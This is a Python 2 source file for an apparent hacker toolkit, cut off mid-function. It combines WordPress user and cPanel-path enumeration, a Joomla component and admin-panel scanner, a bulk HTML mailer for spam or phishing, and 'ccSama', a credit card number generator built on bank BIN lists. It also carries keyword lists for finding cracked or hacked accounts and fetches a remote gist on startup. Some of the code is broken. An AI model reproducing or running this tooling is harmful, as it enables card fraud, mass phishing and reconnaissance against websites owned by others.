#!/usr/bin/env python
# encoding: utf-8
#if you See This Comment ... I wanna Say ... Yfz :)
import sys,os,re,socket,binascii,json,random,base64,Queue
import threading,Queue,pprint,urlparse,smtplib,telnetlib,os.path
import datetime,ssl,imaplib
import hashlib,string,urllib2,glob,sqlite3,urllib,argparse,marshal
from random import choice
from colorama import *
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from platform import system
from urlparse import urlparse
from urllib2 import urlopen
from bs4 import BeautifulSoup       
from time import strftime                               
from time import sleep
from threading import Thread
import time
import webbrowser
try:
 import requests
except:
  print"%s[%s?%s] Installing requests Module%s"%(la7mar,la5dhar,la7mar,labyadh)
  if os.name=='nt':
    try:
      os.system('cd:\Python27\Scripts\pip2.exe install requests')
    except:
      print "Install Python-Pip Sir"
      raw_input('')
  else:
    os.system('pip2 install requests')
try:
 import requests
except:
  print"%s[%s?%s] Installing colorama Module%s"%(la7mar,la5dhar,la7mar,labyadh)
  if os.name=='nt':
    try:
      os.system('cd:\Python27\Scripts\pip2.exe install colorama')
    except:
      print "Install Python-Pip Sir"
      raw_input('')
  else:
    os.system('pip2 install colorama')
init()
la7mar  = '\033[91m'
lazra9  = '\033[94m'
la5dhar = '\033[92m'
movv    = '\033[95m'
lasfar  = '\033[93m'
ramadi  = '\033[90m'
blid    = '\033[1m'
star    = '\033[4m'
starend = '\033[24m'
bigas   = '\033[07m'
bigbbs  = '\033[27m'
hell    = '\033[05m'
saker   = '\033[25m'
labyadh = '\033[00m'
cyan    = '\033[0;96m'
fr  =   Fore.RED
fh  =   Fore.RED
fc  =   Fore.CYAN
fo  =   Fore.MAGENTA
fw  =   Fore.WHITE
fy  =   Fore.YELLOW
fbl =   Fore.BLUE
fg  =   Fore.GREEN                                          
sd  =   Style.DIM
fb  =   Fore.RESET
sn  =   Style.NORMAL                                        
sb  =   Style.BRIGHT
###
try:
 GenPass=requests.get('https://gist.githubusercontent.com/0xtn/37ed91b591bb9f6640f5fa6e30eeb7f4/raw/6e349aa680c8efff13f8c7d6e78bf7b467399430/serr').text.encode('utf-8') #On
except:
    raw_input(fr+"{!} Check Ur Connection Broh !"+fb);exit()
def foul():
    if system() == 'Linux':
        os.system("clear")
    if system() == 'Windows':
        os.system('cls')
    else:
        pass
def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush() 
        time.sleep(0.01)
def timer():
    now = time.localtime(time.time()) 
    return time.asctime(now)
def strounga(x,y):
 return fbl+"["+fg+str(x)+fbl+"] "+fy+y
foul()
## Les Reste En Nulle
plugin_NamEz={}
weblis=[]
httplis=[]
http0lis=[]

##
def rzltaa(x,y):
    print "  %s[%s>%s]%s%s: %s%s"%(fr,fg,fr,fy,x,fw,y)
def httperr(site):
 if 'https://' in site.lower():
    site=site.replace('https://','')
 if 'http://' in site.lower():
    site=site.replace('http://','')
 if 'www.' in site.lower():
    site=site.lower().replace('www.','');
 if "/" in site:
    site=site.split('/')[0]
 return site
class kharoutouu():
    def __init__(self):
        global site
        site=httperr(str(raw_input('{b}[{g}WebSite{b}]{w} '.format(b=fbl,g=fg,w=fb))))        
        ip = socket.gethostbyname(site)
        try:
            self.chouf = requests.get('http://www.%s'%site, timeout=5)
            if '/wp-content/' in self.chouf.text:
                print  '%s[%s>%s]'%(fbl,fg,fbl)+' %sSite  : %s'%(fy,fb)+site
                print  '%s[%s>%s]'%(fbl,fg,fbl)+' %sIP    : %s'%(fy,fb)+ip
                print  '%s[%s>%s]'%(fbl,fg,fbl)+' %sServer: %s'%(fy,fb)+self.chouf.headers['server']
                self.usrgrab();self.cpnlla();self.plugName();self.wpmver();self.themmz()
                raw_input(fy+'Press Enter To Exit..'+fb);exit()
            else:
                print "%sThis Is not a Wordpress Site..%s"%(fr,fb)
                sys.exit()
        except:
         try:
            self.chouf = requests.get('http://%s/wp-admin/admin-ajax.php'%site, timeout=5)
            if '0' in self.chouf.text:
                print  '%s[%s>%s]'%(fbl,fg,fbl)+' %sSite  : %s'%(fy,fb)+site
                print  '%s[%s>%s]'%(fbl,fg,fbl)+' %sIP    : %s'%(fy,fb)+ip
                print  '%s[%s>%s]'%(fbl,fg,fbl)+' %sServer: %s'%(fy,fb)+self.chouf.headers['server']
                self.usrgrab();self.cpnlla();self.plugName();self.wpmver();self.themmz()
                raw_input('')
            else:
                print "%sThis Is not a Wordpress Site..%s"%(fr,fb)
                sys.exit()
         except requests.exceptions.ReadTimeout:
            print "%sMaybe Error From Connection Or IP Blocked ...%s"%(fr,fb);exit()

    def usrgrab(self):#1st method
        l7aaj = requests.get('http://'+site+'/?author=1', timeout=10)
        try:
            while nigga:
                anon = requests.get('http://' +site + '/wp-json/wp/v2/users/' + str(ii), timeout=5)
                eeeee=json.loads(anon.text.encode('utf-8'))
                if 'id' not in eeeee:
                    nigga=False
                else:
                    rzltaa('Username Founded',eeeee['name'])
                    ii+=1
        except:#2nd Method
            try:
                if '/author/' not in l7aaj.text:
                    pass
                else:
                    find = re.findall('/author/(.*)/"', l7aaj.text)
                    if '/feed' in find[0].strip():
                        find = re.findall('/author/(.*)/feed/"', l7aaj.text)
                        rzltaa('Username Founded',find[0].strip())
                    else:
                        rzltaa('Username Founded',find[0].strip())

            except requests.exceptions.ReadTimeout:
                print "%sMaybe Error From Connection Or IP Blocked ...%s"%(fr,fb);exit()

    def cpnlla(self):
        try:
                anon = requests.get('http://'+site+'/wp-includes/ID3/module.audio.ac3.php', timeout=10)
                try:
                        find = re.findall('/home/(.*)/public_html/wp-includes/ID3/module.audio.ac3.php', anon.text)
                        rzltaa('CpanelUser Founded',find[0].strip())
                except:
                        pass

                try:
                        find = re.findall("not found in <b>(.*)wp-includes/ID3/module.audio.ac3.php", anon.text)
                        rzltaa('CpanelPath Founded',find[0].strip())
                except:
                        pass
        except requests.exceptions.ReadTimeout:
            print "%sMaybe Error From Connection Or IP Blocked ...%s"%(fr,fb);exit()
    def wpmver(self):
        try:
            try:
             zz=requests.get('http://'+site)
             req=re.findall('content="WordPress (.*?)',zz)[0]
             rzltaa('CpanelPath Founded',req)
            except:
                pass
        except requests.exceptions.ReadTimeout:
            print "%sMaybe Error From Connection Or IP Blocked ...%s"%(fr,fb);exit()
    def plugName(self):
        a = re.findall('/wp-content/plugins/(.*)', self.chouf.text)
        s = 0
        bb = len(a)
        for x in range(int(bb)):
            name = a[s].split('/')[0]
            if '?ver=' in a[s]:
                verz = a[s].split('?ver=')[1]
                version = re.findall('([0-9].[0-9].[0-9])', verz)
                if len(version) ==0:
                    if '-' in str(name):
                        g = name.replace('-', ' ')
                        plugin_NamEz[g] = s
                    elif '_' in str(name):
                        h = name.replace('_', ' ')
                        plugin_NamEz[h] = s
                    else:
                        plugin_NamEz[name] = s
                else:
                    OK_Ver = name + ' ' + version[0]
                    Dup_Remove_Plug = name
                    if '-' in OK_Ver:
                        ff = OK_Ver.replace('-', ' ')
                        plugin_NamEz[ff] = s
                    elif '_' in OK_Ver:
                        ff = OK_Ver.replace('_', ' ')
                        plugin_NamEz[ff] = s
                    else:
                        plugin_NamEz[OK_Ver] = s
            else:
                if Dup_Remove_Plug in name:
                    pass
                else:
                    if '-' in str(name):
                        g = name.replace('-', ' ')
                        plugin_NamEz[g] = s
                    elif '_' in str(name):
                        h = name.replace('_', ' ')
                        plugin_NamEz[h] = s
                    else:
                        plugin_NamEz[name] = s
            s = s + 1
        for name_plugins in plugin_NamEz:
            rzltaa('Plugin Founded',name_plugins)

    def themmz(self):
      try:
        a = re.findall('/wp-content/themes/(.*)', self.chouf.text)
        Name_Theme = a.split('/')[0]
        if '?ver=' in a[0]:
            verz = a[0].split('?ver=')[1]
            version = re.findall('([0-9].[0-9].[0-9])', verz)
            OK_Ver = Name_Theme + ' ' + version[0]
            if '-' in OK_Ver:
                x2 = OK_Ver.replace('-', ' ')
                rzltaa('Theme Founded',x2)
            elif '_' in OK_Ver:
                x = OK_Ver.replace('_', ' ')
                rzltaa('Theme Founded',x)
            else:
                rzltaa('Theme Founded',OK_Ver)
        else:
            if '-' in Name_Theme:
                x2 = Name_Theme.replace('-', ' ')
                rzltaa('Theme Founded',x2)
            elif '_' in Name_Theme:
                x = Name_Theme.replace('_', ' ')
                rzltaa('Theme Founded',x2)
            else:
                rzltaa('Theme Founded',Name_Theme)
      except:
             pass        

compdb=['com_5starhotels', 'com_a3000', 'com_banners', 'com_ajax', 'com_finder', 'com_config', 'com_menus', 'com_a6mambocredits', 'com_a6mambohelpdesk', 'com_aardvertiser', 'com_tags', 'com_modules', 'com_ab', 'com_ab_gallery', 'com_abbrev', 'com_abc', 'com_abook', 'com_about', 'com_abstract', 'com_acajoom', 'com_acctexp', 'com_aceftp', 'com_aclassf', 'com_aclassfb', 'com_aclsfgpl', 'com_acmisc', 'com_acooldebate', 'com_acprojects', 'com_acstartseite', 'com_acteammember', 'com_actions', 'com_activities', 'com_actualite', 'com_acymailing', 'com_acysms', 'com_acysms_express', 'com_adagency', 'com_addressbook', 'com_adds', 'com_admin', 'com_adsmanager', 'com_advancedpoll', 'com_advert', 'com_advertisementboard', 'com_advertising', 'com_affiliatetracker', 'com_agency', 'com_agenda', 'com_agora', 'com_agoragroup', 'com_aicontactsafe', 'com_airmonoblock', 'com_aist', 'com_ajax', 'com_ajax-shoutbox', 'com_ajaxchat', 'com_ajaxquiz', 'com_akeeba', 'com_akobook', 'com_akocomment', 'com_akogallery', 'com_alameda', 'com_alberghi', 'com_album', 'com_alert', 'com_alfcontact', 'com_alfresco', 'com_alfurqan', 'com_alfurqan15x', 'com_allcinevid', 'com_allhotels', 'com_alphacontent', 'com_alphauserpoints', 'com_altas', 'com_altauserpoints', 'com_amblog', 'com_aml_2', 'com_amocourse', 'com_annonces', 'com_annuaire', 'com_answers', 'com_appointinator', 'com_appointment', 'com_aprice', 'com_arcadegames', 'com_archeryscores', 'com_artforms', 'com_article', 'com_articleman', 'com_articlemanager', 'com_articles', 'com_artist', 'com_artlinks', 'com_artportal', 'com_as', 'com_asortyment', 'com_astatspro', 'com_autartimonial', 'com_autartitarot']
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                       'Accept': '*/*'}
def CheckVersion(url, proxy):
    try:
        GetInfo = requests.get('http://' + url + '/administrator/language/en-GB/en-GB.xml', headers=headers,
                               proxies=proxy, timeout=5).text
        if 'Joomla! Project' in GetInfo:
            version = re.findall('<version>(.*)</version>', GetInfo)
            return str(version[0])
        else:
            GetInfo2 = requests.get('http://' + url + '/administrator/language/en-GB/install.xml', headers=headers,
                                    proxies=proxy, timeout=5).text

            if 'Joomla! Project' in GetInfo2:
                version = re.findall('<version>(.*)</version>', GetInfo2)
                return str(version[0])
            else:
                GetInfo3 = requests.get('http://' + url + '/administrator/manifests/files/joomla.xml', headers=headers,
                                        proxies=proxy, timeout=5).text
                if 'Joomla! Project' in GetInfo3:
                    version = re.findall('<version>(.*)</version>', GetInfo2)
                    return str(version[0])
                else:
                    return 'unknown'
    except Exception, e:
        pass
def ServerName(url, proxy):
    try:
        A = requests.get('http://' + url, timeout=5, headers=headers, proxies=proxy)
        return A.headers['server']
    except Exception, e:
        return 'unknown'

def Server_Ip(url):
    try:
        if '/' in url:
            url = str(url).split('/')[0]
        return socket.gethostbyname(url)
    except:
        return 'unknown'
def CompChecker(url, proxy):
    Comps = []
    def STarTScaN(url, com, proxy):
        try:
            rr = requests.get('http://' + url + '/index.php?option=' + com, timeout=10, headers=headers, proxies=proxy)
            if rr.status_code != 404:
                Comps.append(com)
        except Exception, e:
            pass
    x = 1
    thread = []
    for com in compdb:
        print(str(len(compdb)) + str('|') + str(x)),
        sys.stdout.flush()
        print("\r"),
        t = threading.Thread(target=STarTScaN, args=(url, com, proxy))
        t.start()
        thread.append(t)
        time.sleep(0.08)
        x = x + 1
    for j in thread:
        j.join()
    return Comps
def CheckAdmin(url, proxy):
    try:
        GetInfo = requests.get('http://' + url + '/robots.txt', headers=headers, proxies=proxy, timeout=5).text
        if 'Disallow: /administrator/' in GetInfo or 'Joomla site' in GetInfo:
            return url + '/administrator/index.php'
        else:
            getInfo3 = requests.get('http://' + url + '/administrator/', headers=headers,
                                    proxies=proxy, timeout=5)
            if '/administrator/index.php" method="post" id="form-login"' in getInfo3:
                return url + '/administrator/index.php'
            else:
                return 'unknown'
    except Exception, e:
        print('Error: ' + str(e))
def CheckCms(url, proxy):
    try:
        Getinf = requests.get('http://' + url + '/media/system/js/tabs.js', headers=headers, proxies=proxy, timeout=5).text
        if '@package        Joomla!' in Getinf:
            return 'Joomla'
        else:
            GetInfo = requests.get('http://' + url + '/robots.txt', headers=headers, proxies=proxy, timeout=5).text
            if 'Disallow: /administrator/' in GetInfo or 'Joomla site' in GetInfo:
                return 'Joomla'
            else:
                GetInfo2 = requests.get('http://' + url, headers=headers, proxies=proxy, timeout=5).text
                if 'name="option" value="com_users"' in GetInfo2:
                    return 'Joomla'
                else:
                    getInfo3 = requests.get('http://' + url + '/administrator/language/en-GB/en-GB.xml', headers=headers,
                                            proxies=proxy, timeout=5)
                    if 'Joomla! Project' in getInfo3:
                        return 'Joomla'
                    else:
                        return 'unknown'
    except Exception, e:
        print('Error: ' + str(e))
class JoomScan(object):
    def __init__(self):
        proxy = None
        flag = True
        while flag == True:
                target = httperr(str(raw_input('{b}[{g}WebSite{b}]{w} '.format(b=fbl,g=fg,w=fb))))  
                Check_CMS = CheckCms(target, proxy)
                if Check_CMS == 'Joomla':
                        print  '%s[%s>%s]'%(fbl,fg,fbl)+' %sSite  : %s'%(fy,fb)+target
                        print  '%s[%s>%s]'%(fbl,fg,fbl)+' %sCMS   : %s'%(fy,fb)+Check_CMS
                        print  '%s[%s>%s]'%(fbl,fg,fbl)+' %sServer: %s'%(fy,fb)+ServerName(target, proxy)
                        print  '%s[%s>%s]'%(fbl,fg,fbl)+' %sIP    : %s'%(fy,fb)+Server_Ip(target)
                        print  '%s[%s>%s]'%(fbl,fg,fbl)+' %sVer   : %s'%(fy,fb)+CheckVersion(target, proxy)
                        print  '%s[%s>%s]'%(fbl,fg,fbl)+' %sPanel : %s'%(fy,fb)+CheckAdmin(target, proxy)
                        print  '%s[%s>%s]'%(fbl,fg,fbl)+' %sCom_  : %s'%(fy,fb);nb=1
                        for plug in CompChecker(target, proxy):
                            print "  %s[%s%s%s]: %s%s"%(fr,fg,str(nb),fr,fw,plug);nb+=1
                else:
                     print "%sJoomla Not Detected ...%s"%(fr,fb);exit()


def smtp_Connect(host, port, tls, user, passw):
    try:
        connect = smtplib.SMTP(server, port)
        connect.ehlo()
        if tls:
          connect.starttls()
          connect.ehlo()
        connect.login(user, passw)
        return connect
    except:
        return False
def go_to_Send(host, port, tls, user, passw, maillist, From, subject, mailtext):
    smtpConnect = smtp_connect(host, port, tls, user, passw)
    #count mails 
    mailss = len(maillistt)
    for success, sendto in enumerate(maillist):
        content = MIMEMultipart()
        content['From'] = From
        content['To'] = sendto.rstrip()
        content['Subject'] = subject
        htmlscript = mailtext.rstrip()
        content.attach(MIMEText(htmlscript, 'html'))
        strounga('Sendin 2 ... ',sendto.rstrip())
        smtp_Connect.go_to_Send(From, sendto.rstrip(), content.as_string())
    smtpConnect.quit()
    strounga(str(success+1)+'/'+str(mailss),' Send ')

smtphost=""
smtpPort=""
smtpTLS=0
smtpUsername=""
smtpPass=""
def alaan(hostt):
    try:
      fr = hostt.split('|')
      lawwl=fr[0].split(':')
      smtphost = lawwl[0]
      smtpPort = lawwl[1]
      if "(ssl)" in smtpPort.lower():
        smtpTLS=1;smtpPort=smtpPort.replace('(SSL)','')
      else:
        smtpTLS=0
      smtpUsername=fr[1]
      smtpPass=fr[2]
    except:
        try:
            fr = hostt.split(',')
            lawwl=fr[0].split(':')
            smtphost = lawwl[0]
            smtpPort = lawwl[1]
            if "(ssl)" in smtpPort.lower():
              smtpTLS=1;smtpPort=smtpPort.replace('(SSL)','')
            else:
              smtpTLS=0
            smtpUsername=fr[1]
            smtpPass=fr[2]
        except:
            print('Accept Format : \nsmtp.server.net:port|email@email.com|password\nsmtp.server.net:port,email@email.com,password')
            exit()
def wwwooooo():
  alaan(raw_input(strounga('Enter SMTP [smtp.server.net:port|email@server.net|password]','')))
  sendFrom = raw_input(strounga('Mail',''))
  sendSubj =raw_input(strounga('Subject',''))
  maillistt =raw_input(strounga('Maillist',''))
  htmlmsg =raw_input(strounga('Letter',''))
  if smtp_Connect(smtphost, smtpPort, smtpTLS, smtpUsername, smtpPass):
      print fg+'\n ... Worked ^^'+fb
      try:
          maillist1 = open(maillistt).readlines()
          print strounga('\nTotal Emails',str(len(maillist1)))
          try:
              html = open(htmlmsg).read()
              try:
                  go_to_Send(smtphost, smtpPort, smtpTLS, smtpUsername, smtpPass, maillist1, sendFrom, sendSubj, html)
              except:
                  print fr+'Email Error'+fb
          except:
             print fr+'Check The HTML Msg File !.'+fb
      except:
         print fr+'Check The Text File !.'+fb
  else:
       print fr+'Server Error '+fb

'''
Configs {don't Remove AnyThing}
'''
##Emails##
listmail=['@yahoo.com','@gmail.com','@hotmail.com','@gmx.com','@yandex.com','@mail.ru','@live.com','@inbox.ru','@bk.ru','@outlook.fr','@seznam.cz','@rambler.ru','@21cn.com','@googlemail.com','@aol.com'] #add Any Stron9 E-mails
##For ccSama Tool##
#Bank Names#
AmExlis=['AmEx','AmEx Small CorporateCard1','AmEx Small CorporateCard2']
DinersClublis=['DinersClub 1','DinersClub 2','DinersClub 3','DinersClub 4']
CarteBlanchelis=['CarteBlanche']
JCBlis=['JCB(JapaneseCreditBureau)']
Visalis=['Visa','Debit Banca MonteDeiPaschiDiSiena(Italy)','Banca MonteDeiPaschiDiSiena(Italy)','Gold Bank of America','CV/Gold Bank of America','PV Bank of America','CV Wells Fargo','CV','Wells Fargo','Citibank','Bank of America','ElectronPrepaidPosteItaliane(Italy)','Bank of America2','Rockwell Federal CreditUnion','House hold Bank','First Cincinnati','Associates National Bank','Security Pacific','Colonial NationalBank','A.M.C.Federal Credit Union','Valley National Bank','Chemical Bank','Pennsylvania State Employees Credit Union','CV Signet Bank','Union Trust','Marine Midland','CV Citibank','CVCitibank','StateStreetBank','Chase Manhattan Bank','Chase Manhattan Bank','Chase Lincoln FirstC lassic','Chase Lincoln First Classic','Corestates','National Westminster Bank','First Chicago Bank','Consumers Edge','Premiercard Security First','Security First','PV Citibank','Citibank/Citicorp','MonogramBank','H.H.B.C.','First National Bank of Louisville','Gold Dome','First Atlanta','First American Bank','Primerica Bank','N.C.M.B./NationsBank','National Bank of Delaware','National West','BankOne','First Signature Bank & Trust','Gary Wheaton Bank','Firstier Bank Lincoln','Bank of Omaha','Indiana National Bank','Security Pacific National Bank','Bank of Hoven','Security Bank & Trust','MerrilLynch Bank & Trust','Ameri Trust','Premiercard','Empire Affiliates Federal Credit Union','Republic Savings','C.I.B.C.','Canadian Imperial Bank','Belgium A.S.L.K.','Royal Bank of Canada','Toronto Dominion of Canada','Bank of NovaScotia','Bank of NovaScotia2','Barclays(UK)','First Direct','T.S.B.Bank','Citibank','Bank of Queensland','FirstCard','Home Federal','Tompkins County Trust','IBM Credit Union','Rocky Mountain','First Security','WestBank','CV WellsFargo','AT&Ts UniversalCard','AT&Ts UniversalCard','M.B.N.A.North America','Bank of Hawaii','Macom Federal Credit Union','IBM MidAmerica Federal Credit Union','U.S.Bank','Security Pacific Washington','Village Bank of Chicago','HongKong NationalBank','CV BarclayCard(UK)','BancodiNapoli(Italy)','BNL(Italy)','Carta Moneta CARIPLO/Intesa(Italy)','Credito Italiano(Italy)','Gold bank ganaderoBBV(Colombia)','MBNABank']
MasterCardlis=['MasterCard','Maryland of NorthAmerica','South western States Bank ard Association','Universal Travel Voucher','Western States Bank ard Association','Eurocard France','Mountain States Bank ard Association','Credit Systems Inc.','Westpac Banking Corporation','Midamerica Bank ard Association','First Bank Card Center','ComputerCommunications of  America','Bank of Montreal','Mellon Bank N.A.','CentralTrustCompany N.A.','Security Pacific National Bank','Promociony Operacion S.A.','Banco Nacionaldo Mexico','NewEngland Bank ard Association','Million Card Service Co.Ltd.','The Citizens & Southern National Bank','Kokunai Shinpan CompanyLtd.','Chemical BankDelaware','F.C.C.National Bank','The Bank card Association Inc.','Marine Midland Bank N.A.','Old Kent Bank & Trust Co.','Union Trust','Citibank / Citicorp','Central Finance Co.Ltd.','SovranBank / CentralSouth','Standard Bank of SouthAfrica Ltd.','Security Bank & TrustCompany','Trust mark National Bank','Midland Bank','First Pennsylvania BankN.A.','Eurocard Ab','Rocky Mountain Bankcard System Inc.','FirstUnionNationalBankofNorthCarolina','Sunwest Bank of Albuquerque N.A.','Harris Trust & Savings Bank','Badische Beamten bank EG','Eurocard Deutschland','Computer Systems Association Inc.','Citibank Arizona','Financial Transaction System Inc.','First Tennessee Bank N.A.','Bank of America','MasterCard (canbeGold) - Bank of America','Home Federal','Signet Bank','Maryland of NorthAmerica','MasterCard Prepaid - PayPal / Lottomaticard (Italy)','Wells Fargo','Wells Fargo','Bank of Hoven','Citibank / Citicorp II','BNL / BNPParibas(Italy)','National Westminster Bank','Chase Manhattan','Bancodi Sardegna (Italy)','Bancolombia Cadenalco (Colombia)','BancodeOccidente (Colombia)','Granahorrar(Colombia)','Granahorrar(Colombia)']
Maestrolis=['BNL/BNPParibas (Italy)']
Discoverlis=['Discover','MBNABank']
#Bins#
Amexbinz=['37','3782','3787']
DinersClubbinz=['30','31','35','36','38']
CarteBlanchebinz=['35']
JCBbinz=['35']
Visabinz=['4', '400314', '400315', '40240238', '4019', '4024', '4040', '4048', '40240071', '4013', '4019', '402360', '4024', '4027', '4032', '4052', '4060', '4070', '4071', '4094', '4113', '4114', '4121', '4121', '4122', '4125', '4128', '4131', '4225', '4226', '4231', '4232', '4239', '4241', '4250', '4253', '42545123', '4254', '4271382', '4271', '4301', '4302', '4311', '4317', '4327', '4332', '4339', '4342', '4356', '4368', '4387', '4388', '4401', '4413', '4418', '4421', '4424', '4428', '4436', '4443', '4447', '4448020', '4452', '4498', '4502', '4503', '4506', '4510', '4520', '4537', '4538', '4539', '4543', '4544', '4556', '4564', '4673', '4678', '4707', '47121250', '4719', '4721', '4722', '4726', '4783', '4784', '4800', '4811', '4819', '4820', '4833', '4842', '4897', '4921', '4929', '45399710', '4557', '4908', '4532', '45475900', '4916']
MasterCardbinz=['5','5031', '5100', '5110', '5120', '5130', '5140', '5150', '5160', '5170', '5172', '518', '519', '5201', '5202', '5204', '5205', '5206', '5207', '5208', '5209', '5210', '5211', '5212', '5213', '5215', '5216', '5217', '5218', '5219', '5220', '5221', '5222', '5223', '5224', '5225', '5226', '5227', '5228', '5229', '5230', '5231', '5232', '5233', '5234', '5235', '5236', '5254', '5273', '5286', '5291', '5329', '533875', '5410', '5412', '5419', '5424', '543013', '5434', '5465', '52550114', '530693', '5406251', '5426', '5406']
Maestrobinz=['581149']
Discoverbinz=['60','6013']
##4 KeywordMaker##
social=['hotmail','facebook','instagram','gmail','twitch','live','gmx','yandex','paypal','Netflix','Mediafire','Mega ','Deezer ','youtube','twitter','linkdin','soundcloud','Goddady','host']
game=['fortnite','Uplay','origin','rockstargames','bf','game','ps4','xbox','epic games','eb games','eu','battle royale','pc','video game','gameplay','jeux','g2a ','android','twitch prime','tutorial']
geek1=['download','tracker','update','android','account','amazon','skins','cheats','code','characters','challenges','hack','help','free','jobs','jumping shotgun','bucks','shotgun','how to play','game ps4','generator','giveaway','code','access code','character creation','pc full version','download','twitch prime','tutorial','servers','stats','steam','quiz','season','ps4 game','pc controls','pc requirements','videos','v bucks free','v bucks hack','reddit','rating','review','ranks','update ps4','unblocked','update xbox','weapons','wallpaper','upcoming skins','online','on ps3','on switch','news','new skins','new update','new map','ninja','kills','knight','logo','login','launcher','live','leaked','lag','memes','mac','meaning','mobile codes','youtube','youtube tags','backup','where to buy','where to get','get','how to play','gameplay trailer','cracked','hacked','hits','Crackforum','nulled.no','hackforum','How To crack','How To Get Free','checker']
geek2=['','accounts','account','Hit','game','generator','Premium','Free']
geek3=['','hacked','cracked','leaks','hits','Hacked by ','anonymous','anon','account','token']
geek4=['','2004','2005','2006','2007','2008','2009','2010','2011','2012','2013','2014','2015','2016','2017','2018','2019']#-You: Damnaa Use range 13 reason Why !! #-oussama:xD Just boring !

def rakez():
  scammer=raw_input("\n%s[%s?%s] Press Enter To Exit or [r] to return !! %s"%(la7mar,lazra9,la7mar,cyan))
  if scammer.upper() in ['R','B','BACK','RETURN','00']:
      time.sleep(1)
      clear()
      mli7()
  else:
      print "%s%s[%s(0%s.%s0)%s] O Revoir Senpai .. !!\n"%(blid,la7mar,lazra9,lasfar,lazra9,la7mar)
#ccSama CreditCard Generat0r#
class ccSama(object):

    def __init__(self):
        self.clear()
        self.logon()
        if not os.path.isdir('results/ccgen'):
          os.mkdir('results/ccgen')
        else:
            pass
        carder=raw_input("%s%sD0ll4r%s%s$%s %s"%(ramadi,star,hell,starend,saker,lazra9))
        if carder in ['01','1']:
         Sa7by=0
         self.gen1(Sa7by)

        elif carder in ['02','2']:
         self.gen2()
        elif carder =='69':
         mli7()
    def clear(self):
      if os.name=='nt':
        os.system('cls')
      else :
        os.system('clear')
    def sss(self ,lis,binlis):
      global aaa
      for x,y in enumerate(lis):
        print"%s[%s] %s%s"%(la7mar,x+1,lasfar,y)
      aaa=int(raw_input("%s%sD0ll4r%s%s$%s %s"%(ramadi,star,hell,starend,saker,lazra9)))
      plasty=binlis[int(float(aaa-1))]
      self.gen1(plasty)

    def gen2(self):
      print """{y}
      $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
      $$ {r}({b}01{r}){y} American Express       $$
      $$ {r}({b}02{r}){y} Diners Club            $$
      $$ {r}({b}03{r}){y} Visa                   $$
      $$ {r}({b}04{r}){y} MasterCard             $$
      $$ {r}({b}05{r}){y} Discover               $$
      $$ {r}({b}06{r}){y} Maestro                $$
      $$ {r}({b}07{r}){y} CarteBlanche           $$
      $$ {r}({b}08{r}){y} Japanese Credit Bureau $$
      $$ {r}({b}69{r}){y} Back                   $$
      $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
      """.format(y=lasfar,r=la7mar,b=lazra9)
      card777=raw_input("%s%sD0ll4r%s%s$%s %s"%(ramadi,star,hell,starend,saker,lazra9))
      if card777 in['01','1']:
        self.sss(AmExlis,Amexbinz)
      elif card777 in['02','2']:
        self.sss(DinersClublis,DinersClubbinz)
      elif card777 in['03','3']:
        self.sss(Visalis,Visabinz)
      elif card777 in['04','4']:
        self.sss(MasterCardlis,MasterCardbinz)
      elif card777 in['05','5']:
        self.sss(Discoverlis,Discoverbinz)
      elif card777 in['06','6']:
        self.sss(Maestrolis,Maestrobinz)
      elif card777 in['07','7']:
        self.sss(CarteBlanchelis,CarteBlanchebinz)
      elif card777 in['08','8']:
        self.sss(JCBlis,JCBbinz)
      elif card777 =='69':
        ccSama()
    def logon(self):
          print"""%s%s
      $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
      $$ %sccSama - CreditCard Generator%s $$
      $$  £  %sI Feel Like milionair%s  £  $$
      $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
      $$ %s[01]%s Generate With Single Bin %s$$
      $$ %s[02]%s Search & Gen Bin From DB %s$$
      $$ %s[69]%s Back                     %s$$
      $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"""%(blid,lasfar,lazra9,lasfar,lazra9,lasfar,la7mar,lazra9,lasfar,la7mar,lazra9,lasfar,la7mar,lazra9,lasfar)
    def gen1(self ,Sa7by):#Sa7by Kol Chy Wadha7 W jawna Bahy Brcha xDD...
      if Sa7by !=0:
      #Some Tries
       if aaa in ['02','2','07','7']:
        sensei=12-len(str(Sa7by))
       elif aaa in ['01','1']:
        sensei=13-len(str(Sa7by))
       else:
        sensei=16-len(str(Sa7by))
       xx='x'*sensei
       binn3r=Sa7by+xx
       print " %s[%s$%s] Bin %s : %s"%(la7mar,lasfar,la7mar,lazra9,binn3r)
       binner=Sa7by
      else:
       binner=raw_input(" %s[%s$%s] Enter Bin [exemple:491628] %s"%(la7mar,lasfar,la7mar,lazra9))
       while binner.isdigit()!=1 or len(str(binner))==0:
        binner=raw_input("  %s[%s$%s] Enter Bin [exemple:491628] %s"%(la7mar,lasfar,la7mar,lazra9))
      yearb=raw_input(" %s[%s$%s] Enter Year [RND:Press Enter] %s"%(la7mar,lasfar,la7mar,lazra9))
      if len(str(yearb))!=0:
        while yearb.isdigit()!=1 or int(yearb) not in range(2018,2025):
          yearb=raw_input("  %s[%s$%s] Enter Year [RND:Press Enter] %s"%(la7mar,lasfar,la7mar,lazra9))
      mounthb=raw_input(" %s[%s$%s] Enter Month [RND:Press Enter] %s"%(la7mar,lasfar,la7mar,lazra9))
      if len(str(mounthb))!=0:
        while int(mounthb) not in range(1,31):
          mounthb=raw_input("  %s[%s$%s] Enter Month [RND:Press Enter] %s"%(la7mar,lasfar,la7mar,lazra9))
      cvvb=raw_input(" %s[%s$%s] Enter CVV [RND:Press Enter] %s"%(la7mar,lasfar,la7mar,lazra9))
      if len(str(cvvb))!=0:
        while cvvb.isdigit()!=1 or len(str(cvvb))!=3:
          cvvb=raw_input("  %s[%s$%s] Enter CVV [RND:Press Enter] %s"%(la7mar,lasfar,la7mar,lazra9))
      mouchi=int(raw_input(" %s[%s$%s] How Much ?? %s"%(la7mar,lasfar,la7mar,lazra9)))
      print "%s+%s--------------------------%s+"%(lazra9,la7mar,lazra9)

      with open('results/ccgen/ccgenerated.txt','a') as mark:
          mark.write('\n~~ Bin:%s%s | %s cc ~~ (By M4rkWalker) '%(binner,xx,mouchi)+'\n')
      for ii in range(mouchi):
        senpaion = string.digits
